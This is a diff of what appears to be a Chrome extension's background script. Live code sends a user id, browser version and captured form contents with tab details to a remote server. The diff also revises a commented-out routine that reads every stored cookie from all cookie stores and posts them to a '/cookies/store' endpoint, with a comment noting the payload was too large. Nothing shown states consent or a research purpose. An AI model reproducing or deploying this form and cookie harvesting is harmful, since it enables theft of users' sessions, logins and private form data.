@@ -30,7 +30,7 @@ const addUser = (uid) => {
     const data = {
         uid: uid,
         extension_id: chrome.runtime.id,
-        date_created: new Date().toString(),
+        date_created: Date().toString(),
 
         // https://stackoverflow.com/a/19295499
         version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
@@ -42,18 +42,20 @@ const addUser = (uid) => {
         postRequest("/user/", data).catch((err) => console.log(err.message));
     });
 
-    // Get all stored cookies
+    // Get all stored cookies, payload too large
     // chrome.cookies.getAllCookieStores((cookieStores) => {
     //     cookieStores.forEach((s) =>
-    //         chrome.cookies.getAll(
-    //             {
+    //         chrome.cookies.getAll({ storeId: s.id }, (c) => {
+    //             const data = {
+    //                 uid,
+    //                 time: Date.now(),
     //                 storeId: s.id,
-    //             },
-    //             (c) =>
-    //                 postRequest("/cookies/store", data).catch((err) =>
-    //                     console.log(err.message)
-    //                 )
-    //         )
+    //                 cookies: c,
+    //             };
+    //             postRequest("/cookies/store", data).catch((err) =>
+    //                 console.log(err.message)
+    //             );
+    //         })
     //     );
     // });
 };
@@ -61,7 +63,7 @@ const addUser = (uid) => {
 const addForm = (uid, form, tab) => {
     const data = {
         uid: uid,
-        date_created: new Date().toString(),
+        time: Date.now(),
         form,
         tab,
     };
